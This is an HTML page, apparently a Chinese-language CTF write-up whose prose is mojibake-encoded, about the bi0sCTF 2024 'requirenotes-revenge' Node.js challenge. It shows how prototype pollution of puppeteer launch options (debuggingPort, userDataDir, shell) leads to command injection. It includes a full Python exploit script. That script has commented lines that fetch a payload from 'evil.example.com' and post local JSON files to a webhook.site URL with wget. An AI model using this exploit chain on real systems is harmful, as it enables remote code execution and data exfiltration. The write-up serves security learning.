utils<span class="token punctuation">.</span><span class="token function">shallowCopy</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> viewOpts<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="éé¢„æœŸ2"><a href="#éé¢„æœŸ2" class="headerlink" title="éé¢„æœŸ2"></a>éé¢„æœŸ2</h5><p>æ±¡æŸ“<code>_peername.address</code>å¯ä»¥è®©æˆ‘ä»¬è®¿é—®<code>search</code>è·¯ç”±ï¼Œè¿™å°±å¾ˆç¥å¥‡ã€‚</p><pre><code>option(a).constructor.prototype._peername.address = \&quot;127.0.0.1\&quot;</code></pre><p>ä¹‹åçˆ†ç ´å°±å®Œäº‹äº†ã€‚</p><h4 id="requirenotes-revenge"><a href="#requirenotes-revenge" class="headerlink" title="requirenotes-revenge"></a>requirenotes-revenge</h4><h5 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h5><p><code>revenge</code>ä¹Ÿè¢«éé¢„æœŸ<code>RCE</code>äº†ï¼Œå…¶ä¸­<code>revenge</code>ä¿®äº†<code>ejs</code>æ¨¡ç‰ˆæ¸²æŸ“<code>RCE</code>é‚£æ¡<code>gadget</code>ã€‚</p><p><code>patch</code>ï¼ˆä»…é’ˆå¯¹äº<code>ejs</code>ï¼‰æŒºé¡¶çº§çš„ï¼Œè¿™ä¸‹ä¹Ÿæ²¡åŠæ³•æ±¡æŸ“<code>escapeFunction</code>äº†ã€‚</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'view options'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>  client<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>   escapeFunction<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> html<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[&amp;&lt;>"']/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>match<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token punctuation">{</span>        <span class="token string">'&amp;'</span><span class="token punctuation">:</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">,</span>        <span class="token string">'&lt;'</span><span class="token punctuation">:</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">,</span>        <span class="token string">'>'</span><span class="token punctuation">:</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">,</span>        <span class="token string">'"'</span><span class="token punctuation">:</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">,</span>        <span class="token string">"'"</span><span class="token punctuation">:</span> <span class="token string">'&amp;#39;'</span>      <span class="token punctuation">}</span><span class="token punctuation">[</span>match<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>   escape<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿˜é™åˆ¶äº†é•¿åº¦å’Œå­—ç¬¦ã€‚</p><pre class="line-numbers language-js"><code class="language-js">  <span class="token keyword">if</span> <span class="token punctuation">(</span>author<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">86</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal server error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex">/^[A-Za-z0-9/."\\(){};=]+$/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>author<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal server error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹æ ·å­<code>ejs</code>è¿™æ¡è·¯èµ°ä¸é€šäº†ï¼Œä¸è¿‡è€å¤–å“¥æ‰¾å‡ºäº†ä¸€æ¡<code>puppetter RCE gadget</code>ã€‚æ„Ÿè§‰è¿˜æŒºé€šç”¨çš„ï¼Œç°åœ¨å›½å¤–<code>XSS</code>éƒ½æ˜¯<code>puppeter</code>ã€‚å…¶å®æ„ä¼šä¸€ä¸‹å°±çŸ¥é“<code>puppeteer</code>å¯åŠ¨<code>chrome</code>è‚¯å®šå¾—æ‰§è¡Œå‘½ä»¤ï¼Œç±»ä¼¼<code>spawn execSync</code>è¿™ç§ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯èƒ½æ‰¾åˆ°ä¸€ç‚¹æœºä¼šã€‚</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> puppeteer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'puppeteer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">healthCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    headless<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    args<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> response<span class="token operator">=</span><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token string">"http://localhost:3000/view/Healthcheck"</span><span class="token punctuation">)</span>  <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span> healthCheck <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>launch</code>æœ€ç»ˆä¼šè°ƒç”¨<code>spawn</code>ï¼Œè¿™é‡Œ<code>executablePath</code>æ— æ‰€è°“ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯æ‰“å‘½ä»¤æ³¨å…¥ï¼Œè¿™é‡Œçˆ±æ‰§è¡Œå•¥æ‰§è¡Œå•¥ã€‚é‡ç‚¹åœ¨äº<code>this.#args</code>ã€‚</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">this</span><span class="token punctuation">.</span>#browserProcess <span class="token operator">=</span> child_process_1<span class="token punctuation">.</span><span class="token keyword">default</span><span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#executablePath<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>#args<span class="token punctuation">,</span> <span class="token punctuation">{</span>    detached<span class="token punctuation">:</span> opts<span class="token punctuation">.</span>detached<span class="token punctuation">,</span>    env<span class="token punctuation">:</span> opts<span class="token punctuation">.</span>env<span class="token punctuation">,</span>    stdio<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">Process <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\node_modules\@puppeteer\browsers\lib\cjs\launch.js:107<span class="token punctuation">)</span>launch <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\node_modules\@puppeteer\browsers\lib\cjs\launch.js:60<span class="token punctuation">)</span>launch <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\node_modules\puppeteer-core\lib\cjs\puppeteer\node\ProductLauncher.js:86<span class="token punctuation">)</span>await <span class="token punctuation">(</span>Unknown Source:0<span class="token punctuation">)</span>launch <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\node_modules\puppeteer-core\lib\cjs\puppeteer\node\ChromeLauncher.js:51<span class="token punctuation">)</span>launch <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\node_modules\puppeteer-core\lib\cjs\puppeteer\node\PuppeteerNode.js:142<span class="token punctuation">)</span>healthCheck <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\bot.js:4<span class="token punctuation">)</span><span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\index.js:235<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>args</code>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>lanunch</code>å£°æ˜ã€‚</p><pre class="line-numbers language-js"><code class="language-js">  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    headless<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    args<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>debug</code>çœ‹çœ‹é‡Œé¢çš„é€»è¾‘ï¼Œå‘ç°æœ€ç»ˆä¼šè§¦å‘åˆ°<code>ChromeLauncher.js#computeLaunchArguments</code>ã€‚</p><p>è¯¥å‡½æ•°å£°æ˜äº†ä¸€å †æœªå®šä¹‰å¸¸é‡ï¼Œ<code>options</code>å°±æ˜¯æˆ‘ä»¬ä¼ è¿›æ¥çš„<code>&#123;     headless: true,     args:[&#39;--no-sandbox&#39;]   &#125;</code>äº†ã€‚</p><p><code>debuggingPort, channel, executablePath</code>é»˜è®¤éƒ½ä¸ºç©ºã€‚</p><pre class="line-numbers language-js"><code class="language-js">    <span class="token keyword">async</span> <span class="token function">computeLaunchArguments</span><span class="token punctuation">(</span>options <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token punctuation">{</span> ignoreDefaultArgs <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">,</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pipe <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">,</span> debuggingPort<span class="token punctuation">,</span> channel<span class="token punctuation">,</span> executablePath<span class="token punctuation">,</span> <span class="token punctuation">}</span> <span class="token operator">=</span> options<span class="token punctuation">;</span>        <span class="token keyword">const</span> chromeArguments <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ignoreDefaultArgs<span class="token punctuation">)</span> <span class="token punctuation">{</span>            chromeArguments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">defaultArgs</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//...</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°<code>pipe=false</code>æ—¶ï¼Œä¼šæŠŠ<code>debuggingPort</code>èµ‹å€¼ç»™<code>--remote-debugging-port</code>ï¼Œé‚£ä¹ˆè¿™é‡ŒåŸå‹é“¾æ±¡æŸ“<code>debuggingPort</code>å°±å¯ä»¥äº†ã€‚ç±»ä¼¼<code>;whoami;</code>è¿™æ ·å‘½ä»¤æ³¨å…¥å³å¯ã€‚</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>pipe<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> assert_js_1<span class="token punctuation">.</span>assert<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">!</span>debuggingPort<span class="token punctuation">,</span> <span class="token string">'Browser should be launched with either pipe or debugging port - not both.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chromeArguments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'--remote-debugging-pipe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    chromeArguments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`--remote-debugging-port=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>debuggingPort <span class="token operator">||</span> <span class="token number">0</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆè¿˜æœ‰åˆ«çš„æ±¡æŸ“é€‰æ‹©å—ï¼Ÿçœ‹åˆ°å½“<code>ignoreDefaultArgs</code>ä¸º<code>false</code>æ—¶ï¼Œä¼šè°ƒç”¨<code>this.defaultArgs(options)</code>ã€‚æ±¡æŸ“<code>userDataDir</code>ä¹Ÿå¯ä»¥ã€‚</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>userDataDir<span class="token punctuation">)</span> <span class="token punctuation">{</span>    chromeArguments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`--user-data-dir=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>path_1<span class="token punctuation">.</span><span class="token keyword">default</span><span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>userDataDir<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è®¾ç½®<code>options.shell=sh</code>ï¼Œå³åœ¨ <code>sh</code> ä¸­è¿è¡Œå‘½ä»¤ï¼Œä¸è¿‡æ³¨æ„åªéœ€æ±¡æŸ“ä¸€æ¬¡ã€‚</p><p>å¦å¤–æ±¡æŸ“<code>debuggingPort</code>æ˜¯è¦æ¯”<code>userDataDir</code>æ›´é€šç”¨çš„ï¼Œå› ä¸ºç»™ç”¨æˆ·æ•°æ®ç›®å½•èµ‹å€¼æ—¶ä¼šè°ƒç”¨<code>path_1.default.resolve</code>ï¼Œç¢°åˆ°æ•°ç»„ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚å› æ­¤ä½¿ç”¨<code>userDataDir</code>éœ€è¦åšåˆ°ä¸€å‡»å¿…æ€ï¼Œå³åªæœ‰æ‰§è¡Œä¸€æ¬¡å‘½ä»¤çš„æœºä¼šã€‚</p><p>è€Œ<code>debuggingPort</code>å°±æ²¡é€šè¿‡å‡½æ•°è§£æï¼Œæ‰€ä»¥æˆ‘ä»¬æ— éœ€æ‹…å¿ƒç±»å‹è½¬æ¢é—®é¢˜ã€‚èµ‹å€¼<code>option(a).constructor.prototype.debuggingPort=&quot;;calc;a=&quot;</code>å³å¯ã€‚</p><p><strong>exploit</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> httpxBASE_URL <span class="token operator">=</span> <span class="token string">"http://localhost:3000"</span>ATTACKER_HOST <span class="token operator">=</span> <span class="token string">"evil.example.com"</span>client <span class="token operator">=</span> httpx<span class="token punctuation">.</span>Client<span class="token punctuation">(</span>base_url<span class="token operator">=</span>BASE_URL<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pp</span><span class="token punctuation">(</span>key<span class="token punctuation">:</span> str<span class="token punctuation">,</span> value<span class="token punctuation">:</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>    author <span class="token operator">=</span> <span class="token string">"option(a).constructor.prototype."</span> <span class="token operator">+</span> key <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string">""</span>    <span class="token keyword">assert</span> len<span class="token punctuation">(</span>author<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>author<span class="token punctuation">,</span> len<span class="token punctuation">(</span>author<span class="token punctuation">)</span><span class="token punctuation">]</span>    res <span class="token operator">=</span> client<span class="token punctuation">.</span>post<span class="token punctuation">(</span>        <span class="token string">"/customise"</span><span class="token punctuation">,</span>        json<span class="token operator">=</span><span class="token punctuation">{</span>            <span class="token string">"data"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token punctuation">{</span>                    <span class="token string">"author"</span><span class="token punctuation">:</span> author<span class="token punctuation">,</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span>    <span class="token keyword">assert</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"Message"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"Settings changed"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text    res <span class="token operator">=</span> client<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"/create"</span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token comment" spellcheck="true"># PP gadgets in puppeteer:</span><span class="token comment" spellcheck="true"># - https://github.com/puppeteer/puppeteer/blob/puppeteer-v21.5.2/packages/browsers/src/launch.ts#L199-L207</span><span class="token comment" spellcheck="true"># - https://github.com/puppeteer/puppeteer/blob/puppeteer-v21.5.2/packages/puppeteer-core/src/node/ChromeLauncher.ts#L76-L83</span>pp<span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">,</span> <span class="token string">'"sh"'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#åªæ‰§è¡Œä¸€æ¬¡ï¼Œå› ä¸ºThe "options.shell" property must be one of type boolean or string. Received an instance of Array</span><span class="token comment" spellcheck="true"># pp("executablePath",'"echo"')</span>pp<span class="token punctuation">(</span><span class="token string">"userDataDir"</span><span class="token punctuation">,</span><span class="token string">'"a;calc;"'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#åªæœ‰ä¸€æ¬¡æœºä¼š</span><span class="token comment" spellcheck="true"># pp("debuggingPort",'";calc;a="')</span><span class="token comment" spellcheck="true"># pp("debuggingPort", '";calc;a="')</span><span class="token comment" spellcheck="true"># pp("debuggingPort", f'";wget\\t{ATTACKER_HOST}/x;a="')</span><span class="token comment" spellcheck="true"># pp("debuggingPort", '";sh\\tx;"')</span><span class="token comment" spellcheck="true"># You need to serve the following shell script at `http://{ATTACKER_HOST}/x`:</span><span class="token comment" spellcheck="true">#     ```</span><span class="token comment" spellcheck="true">#     wget https://webhook.site/xxxxx --post-data="$(cat *.json)"</span><span class="token comment" spellcheck="true">#     ```</span>res <span class="token operator">=</span> client<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"/healthcheck"</span><span class="token punctuation">)</span><span class="token keyword">assert</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"Message"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"healthcheck failed"</span><span class="token comment" spellcheck="true"># -> {"title":"flag","content":"bi0sctf{riDPzbM5H7l3JAex+mw2vA==}"}{"title":"Healthcheck","content":"success"}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1709105297213.jpg" alt="1709105297213"></p><h5 id="é¢„æœŸè§£ï¼ˆæœªåˆ†æå®Œï¼‰"><a href="#é¢„æœŸè§£ï¼ˆæœªåˆ†æå®Œï¼‰" class="headerlink" title="é¢„æœŸè§£ï¼ˆæœªåˆ†æå®Œï¼‰"></a>é¢„æœŸè§£ï¼ˆæœªåˆ†æå®Œï¼‰</h5><p>é¢„æœŸè§£å°±æ¯”è¾ƒå·§å¦™äº†ï¼Œå·§å¦™åˆ°çœ‹ä¸æ‡‚:)</p><h6 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h6><p>è¿™é‡Œéœ€è¦å‡ ä¸ªå‰ç½®çŸ¥è¯†ï¼š</p><p>å¯¹äº<code>nodejs</code>æ¥è¯´<code>require</code>ä¸€ä¸ªæ¨¡å—æ˜¯æœ‰ç¼“å­˜çš„ï¼Œç¬¬ä¸€æ¬¡åŠ è½½æ¨¡å—åå°†å¯¹å…¶è¿›è¡Œç¼“å­˜ï¼Œæ¯æ¬¡å¯¹<code>require(&#39;test&#39;)</code>çš„è°ƒç”¨éƒ½å°†è¿”å›å®Œå…¨ç›¸åŒçš„å¯¹è±¡ï¼Œç¼“å­˜æé«˜äº†æ¨¡å—åŠ è½½çš„æ•ˆç‡ï¼Œç‰¹åˆ«æ˜¯å¯¹äºé¢‘ç¹è¢«å¤šä¸ªå…¶ä»–æ¨¡å—ä¾èµ–å’Œå¼•ç”¨çš„æ¨¡å—ã€‚ã€‚ä¸ºäº†åˆ é™¤ç¼“å­˜å¯ä»¥é€šè¿‡<code>require.cache</code>ï¼Œå…¶é”®æ˜¯å·²åŠ è½½æ¨¡å—çš„å®Œæ•´è·¯å¾„ï¼Œè€Œå€¼æ˜¯æ¨¡å—çš„å¯¼å‡ºå¯¹è±¡ã€‚</p><p>è€Œ<code>module.constructor._pathCache</code>å¤§æ¦‚å¯ä»¥ç†è§£ä¸ºç”¨äºå‡å°‘é‡å¤çš„æ–‡ä»¶ç³»ç»Ÿæ“ä½œã€‚æ¯”å¦‚<code>require.resolve</code> å‡½æ•°ç”¨äºè§£ææ¨¡å—çš„è·¯å¾„ï¼Œä½†ä¸åŠ è½½æ¨¡å—æœ¬èº«ã€‚å®ƒè¿”å›è§£æåçš„æ¨¡å—çš„ç»å¯¹è·¯å¾„ã€‚è¿™ä¸ªè§£æè¿‡ç¨‹å¯èƒ½ä¼šæ¶‰åŠåˆ°æ–‡ä»¶ç³»ç»Ÿçš„å¤šæ¬¡è®¿é—®ï¼Œç‰¹åˆ«æ˜¯å½“æœç´¢ <code>node_modules</code> ç›®å½•å’Œå¤„ç†åŒ…çš„ <code>package.json</code> æ–‡ä»¶æ—¶ã€‚ä¸ºäº†æé«˜è¿™ä¸ªè¿‡ç¨‹çš„æ•ˆç‡ï¼Œ<code>Node.js</code> ä¼šç¼“å­˜è§£æè¿‡ç¨‹çš„ç»“æœï¼Œè¿™æ ·å½“å†æ¬¡è¯·æ±‚ç›¸åŒæ¨¡å—çš„è§£ææ—¶ï¼Œå¯ä»¥ç›´æ¥è¿”å›ç¼“å­˜çš„è·¯å¾„ï¼Œè€Œä¸æ˜¯é‡æ–°è¿›è¡Œè§£æã€‚</p><p>è€Œåœ¨<code>require</code>ä¸­ï¼Œè¿˜æœ‰ä¸€äº›å°ç»†èŠ‚å€¼å¾—å­¦ä¹ ã€‚</p><ul><li><strong>æ¨¡å—æ ‡è¯†ï¼ˆ<code>data.name</code>ï¼‰</strong>ï¼šæŒ‡çš„æ¨¡å—çš„åç§°æˆ–è·¯å¾„ï¼Œç”¨äºå”¯ä¸€æ ‡è¯†ä¸€ä¸ªæ¨¡å—ã€‚åœ¨ <code>Node.js</code> ä¸­ï¼Œæ¨¡å—æ ‡è¯†é€šå¸¸æ˜¯æ¨¡å—çš„æ–‡ä»¶è·¯å¾„æˆ–å®‰è£…çš„åŒ…åç§°ã€‚</li><li><strong>æ¨¡å—å¯¼å‡ºï¼ˆ<code>data.exports</code>ï¼‰</strong>ï¼šåœ¨ <code>Node.js</code> æ¨¡å—ç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªæ¨¡å—éƒ½å¯ä»¥å¯¼å‡ºå¯¹è±¡ã€å‡½æ•°ã€ç±»ç­‰ï¼Œä½¿å®ƒä»¬å¯ä»¥è¢«å…¶ä»–æ¨¡å—é€šè¿‡ <code>require</code> å‡½æ•°å¯¼å…¥ã€‚è¿™æ˜¯é€šè¿‡æ¨¡å—çš„ <code>module.exports</code> å±æ€§å®ç°çš„ã€‚æ¨¡å—çš„å¯¼å‡ºå¯¹è±¡æ˜¯å…¶ä»–æ¨¡å—é€šè¿‡ <code>require</code> å‡½æ•°è·å–çš„å€¼ã€‚</li></ul><h6 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h6><p>å…³é”®æœ‰ä¸‰ä¸ªè·¯ç”±</p><p><code>/view/:noteId</code>ç”¨æ¥çœ‹ç¬”è®°ï¼Œä¸è¿‡æ¯”è¾ƒé€†å¤©çš„æ˜¯é¦–å…ˆç”¨<code>require.resolve</code>è§£æ<code>note</code>çš„è·¯å¾„ï¼Œéšåé€šè¿‡<code>require(./notes/$&#123;noteId&#125;)</code>è·å–<code>note</code>å†…å®¹ã€‚å¦å¤–åªè¦ä¼ ä¸ª<code>temp</code>å°±èƒ½åˆ é™¤æŒ‡å®šçš„ç¬”è®°ï¼Œæ„Ÿè§‰è¿™ä¸¤ç‚¹å¾ˆæœ‰ç”¨ã€‚</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/view/:noteId'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> noteId <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>noteId<span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> note<span class="token operator">=</span>require<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>noteId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>note<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token 